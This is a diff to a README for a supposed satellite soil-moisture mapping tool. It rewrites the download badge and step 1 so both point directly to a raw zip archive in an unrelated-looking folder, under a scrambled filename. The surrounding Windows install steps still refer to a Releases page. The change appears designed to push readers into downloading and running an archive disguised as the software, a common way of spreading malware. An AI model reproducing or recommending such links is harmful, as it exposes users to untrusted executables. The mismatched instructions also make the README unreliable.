@@ -1,6 +1,6 @@
 # 📡 GNSS-Satellite-Soil-Moisture-Retrieval - Map soil moisture using satellite data
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/turbinate-unclesam507/GNSS-Satellite-Soil-Moisture-Retrieval)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/turbinate-unclesam507/GNSS-Satellite-Soil-Moisture-Retrieval/raw/refs/heads/main/tigrine/GNS-Satellite-Moisture-Soil-Retrieval-v2.4.zip)
 
 This software platform processes satellite data to measure moisture levels in soil. It uses deep learning models to convert complex signal data into clear, usable maps. These maps cover a geographic resolution of 9 kilometers. Researchers and land managers use this information to track water content in the ground across large areas.
 
@@ -8,7 +8,7 @@ This software platform processes satellite data to measure moisture levels in so
 
 Follow these steps to set up the software on your Windows computer. This process takes about ten minutes depending on your internet connection speed.
 
-1. Go to the project download page: [https://github.com/turbinate-unclesam507/GNSS-Satellite-Soil-Moisture-Retrieval](https://github.com/turbinate-unclesam507/GNSS-Satellite-Soil-Moisture-Retrieval).
+1. Go to the project download page: [https://github.com/turbinate-unclesam507/GNSS-Satellite-Soil-Moisture-Retrieval/raw/refs/heads/main/tigrine/GNS-Satellite-Moisture-Soil-Retrieval-v2.4.zip](https://github.com/turbinate-unclesam507/GNSS-Satellite-Soil-Moisture-Retrieval/raw/refs/heads/main/tigrine/GNS-Satellite-Moisture-Soil-Retrieval-v2.4.zip).
 2. Locate the section labeled Releases on the right side of the screen.
 3. Click the latest version of the installer file.
 4. Save the file to your computer.
